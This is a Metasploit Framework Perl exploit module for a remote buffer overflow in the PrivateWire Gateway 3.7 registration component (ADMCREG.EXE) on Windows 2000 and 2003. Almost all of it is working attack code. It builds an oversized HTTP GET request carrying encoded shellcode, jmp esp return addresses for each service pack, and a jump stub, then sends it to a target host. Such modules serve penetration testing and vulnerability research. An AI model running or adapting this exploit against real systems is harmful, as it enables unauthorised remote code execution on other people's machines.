PrivateWire Gateway 3.7 Remote Buffer Overflow Exploit (win32)
==============================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

##
# From the author:
# This file may only be distributed as part of the Metasploit Framework.
# Any other use needs a written permission from the author.
##

package Msf::Exploit::privatewire_gateway_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;  => &#039;Private Wire Gateway Buffer Overflow (win32)&#039;,
	&#039;Version&#039;  => &#039;$Rev$&#039;,
	&#039;Authors&#039; =>
	  [
		&#039;Michael Thumann  <mthumann[at]ernw.de>&#039;,
	  ],
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039; ],
	&#039;Priv&#039;  => 1,

	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 80],
		&#039;PATH&#039;  => [1, &#039;DATA&#039;, &#039;Installation Path of Privatewire&#039;,&#039;C:\Cipgw&#039;],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;    => 8000,
		&#039;BadChars&#039; => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x1b",
		&#039;Prepend&#039;  => "\x81\xc4\x54\xf2\xff\xff", # add esp, -3500
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
        This exploits a buffer overflow in the ADMCREG.EXE used
        in the PrivateWire Online Registration Facility. .
}),

	&#039;Refs&#039;  =>
	  [
		[&#039;BID&#039;, &#039;18647&#039;],
	  ],

	&#039;DefaultTarget&#039; => 4,
	&#039;Targets&#039; => [
		[&#039;Windows 2000 English SP0&#039;, 0x77e3c289], # jmp esp USER32.DLL
		[&#039;Windows 2000 English SP1&#039;, 0x77e3cb4c], # jmp esp USER32.DLL
		[&#039;Windows 2000 English SP2&#039;, 0x77e3af64], # jmp esp USER32.DLL
		[&#039;Windows 2000 English SP3&#039;, 0x77e388a7], # jmp esp USER32.DLL
		[&#039;Windows 2000 English SP4&#039;, 0x77e3c256], # jmp esp USER32.DLL
		[&#039;Windows 2003 English SP0/SP1&#039;, 0x77d74c94], # jmp esp USER32.DLL
		[&#039;Debugging&#039;, 0x41414141], # Crash
	  ],

	&#039;Keys&#039; => [&#039;privatewire&#039;],

	&#039;DisclosureDate&#039; => &#039;June 26 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $path        = $self->GetVar(&#039;PATH&#039;);
	my $path_offset = length($path)-8;

	my $target = $self->Targets->[$target_idx];

	my $pattern = Pex::Text::AlphaNumText(8192);
	my $jmp = # add 25 to ecx and jmp
	  "\x6a\x19".
	  "\x58".
	  "\x01\xc1".
	  "\xff\xe1";
	substr($pattern, 0, length($shellcode), $shellcode);
	substr($pattern, 8156- $path_offset, 4, pack(&#039;V&#039;, $target->[1]));
	substr($pattern, 8160, length($jmp), $jmp);

	my $request = "GET /" . $pattern . " HTTP/1.0\r\n\r\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using jmp esp at 0x%.8x...", $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$s->Send($request);
	$s->Close();
	return;
}

1;


